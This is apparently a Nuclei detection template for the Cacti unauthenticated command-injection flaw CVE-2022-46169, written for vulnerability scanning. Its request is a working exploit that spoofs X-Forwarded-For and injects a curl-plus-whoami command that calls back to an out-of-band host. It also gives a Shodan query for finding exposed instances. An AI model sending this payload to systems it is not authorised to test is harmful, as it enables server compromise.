id: CVE-2022-46169
info:
  name: Cacti <= 1.2.22 - Unauthenticated Command Injection
  author: Hardik-Solanki
  severity: critical
  description: The Cacti <= 1.2.22 vulnerability (CVE-2022-46169) allows a remote
    non-authenticated attacker to execute arbitrary OS commands on the affected system
    via a specially crafted HTTP request with a custom Forwarded-For HTTP header.
  reference:
  - https://security-tracker.debian.org/tracker/CVE-2022-46169
  - https://nvd.nist.gov/vuln/detail/CVE-2022-46169
  - https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
  - https://www.cybersecurity-help.cz/vdb/SB2022121926
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-46169
    cwe-id: CWE-285
  metadata:
    shodan-query: title:"Login to Cacti"
    verified: 'true'
    impact: The vulnerability CVE-2022-46169 in Cacti <=1.2.22 can lead to a devastating
      impact as a remote attacker can execute arbitrary OS commands on the server
      without any authentication, compromising the entire system.
    recommendation: It is recommended that users upgrade Cacti to version 1.2.23 or
      above to mitigate the risk of remote OS command execution by potential attackers
      exploiting the CVE-2022-46169 vulnerability.
  tags: cve2022,cve,auth-bypass,cacti,kev,rce,unauth
variables:
  useragent: '{{rand_base(6)}}'
requests:
- raw:
  - 'GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;curl%20{{interactsh-url}}/`whoami`;
    HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: 127.0.0.1

    '
  unsafe: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"value":'
    - '"local_data_id":'
    condition: and
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: {{useragent}}'
  - type: status
    status:
    - 200
